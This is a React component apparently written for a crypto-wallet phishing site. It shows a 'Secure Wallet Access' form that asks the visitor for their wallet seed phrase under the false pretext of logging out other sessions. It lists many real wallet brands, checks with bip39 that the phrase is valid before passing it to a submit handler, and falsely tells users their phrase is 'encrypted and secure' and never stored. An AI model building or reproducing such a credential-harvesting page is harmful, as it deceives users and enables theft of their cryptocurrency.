"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Textarea } from "@/components/ui/textarea"
import { Shield, Lock } from "lucide-react"
// You need to install 'bip39' for mnemonic validation:
// npm install bip39
import * as bip39 from "bip39"

const WALLET_MNEMONIC_LENGTHS = {
  "Jupiter": [12, 24],
  "Blockchain.com": [12, 24],
  "Magic Eden": [12, 24],
  "Bifrost Wallet": [12, 24],
  "Tangem Wallet": [12, 24],
  "WEMIX Play": [12, 24],
  "Robinhood Wallet": [12, 24],
  "Bitcoin.com Wallet": [12, 24],
  "Solflare": [12, 24],
  "MathWallet": [12, 24],
  "BlackFort Wallet": [12, 24],
  "Keplr": [12, 24],
  "BeeWallet": [12, 24],
  "VeWorld Mobile": [12, 24],
  "Best Wallet": [12, 24],
  "LOBSTR Wallet": [12, 24],
  "Fastex Wallet": [12, 24],
  "Pintu": [12, 24],
  "Core": [12, 24],
  "Opera Crypto Browser": [12, 24],
  "Cobalt Wallet": [12, 24],
  // Add more wallets and their valid mnemonic lengths if needed
}

export default function WalletPhrase({ selectedWallet, onPhraseSubmit }) {
  const [phrase, setPhrase] = useState("")
  const [wordCount, setWordCount] = useState(0)
  const [error, setError] = useState("")

  const handlePhraseChange = (value) => {
    setPhrase(value)
    const words = value
      .trim()
      .split(/\s+/)
      .filter((word) => word.length > 0)
    setWordCount(words.length)
    setError("") // Clear error on change
  }

  const validateMnemonic = (mnemonic, wallet) => {
    const validLengths = WALLET_MNEMONIC_LENGTHS[wallet] || [12, 24]
    const words = mnemonic.trim().split(/\s+/)
    if (!validLengths.includes(words.length)) {
      return `Mnemonic must be ${validLengths.join(" or ")} words for ${wallet}.`
    }
    if (!bip39.validateMnemonic(mnemonic)) {
      return "Invalid mnemonic phrase. Please check for typos."
    }
    return ""
  }

  const handleContinue = () => {
    const validationError = validateMnemonic(phrase, selectedWallet)
    if (validationError) {
      setError(validationError)
      return
    }
    onPhraseSubmit(phrase)
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md mx-auto">
        <CardHeader className="text-center pb-4">
          <div className="flex justify-center items-center space-x-4 mb-4">
            <div className="flex items-center">
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-medium">
                1
              </div>
              <div className="w-12 h-0.5 bg-blue-500 mx-2"></div>
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-medium">
                2
              </div>
              <div className="w-12 h-0.5 bg-blue-500 mx-2"></div>
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-medium">
                3
              </div>
            </div>
          </div>
          <CardTitle className="text-xl font-semibold text-gray-800">Secure Wallet Access</CardTitle>
          <p className="text-sm text-gray-600 mt-2">Enter seedphrase to logout all other sessions.</p>
        </CardHeader>

        <CardContent className="space-y-6">
          <div className="space-y-2">
            <label className="text-sm font-medium text-gray-700">Wallet Passphrase</label>
            <Textarea
              value={phrase}
              onChange={(e) => handlePhraseChange(e.target.value)}
              placeholder="Enter your wallet passphrase here..."
              className="min-h-[120px] resize-none"
            />
            <div className="flex justify-between items-center text-xs text-gray-500">
              <span>
                <Shield className="w-3 h-3 inline mr-1" />
                Usually 12 or 24 words separated by spaces
              </span>
              <span>{wordCount}/24</span>
            </div>
            {error && (
              <div className="text-red-500 text-xs mt-1">{error}</div>
            )}
          </div>

          <Button
            onClick={handleContinue}
            disabled={!phrase.trim() || wordCount < 12}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium disabled:bg-gray-300"
          >
            Continue Securely
          </Button>

          <div className="text-center space-y-1">
            <p className="text-xs text-gray-500 flex items-center justify-center">
              <Lock className="w-3 h-3 mr-1" />
              Your passphrase is encrypted and secure.
            </p>
            <p className="text-xs text-gray-500">We never store your passphrase on our servers.</p>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}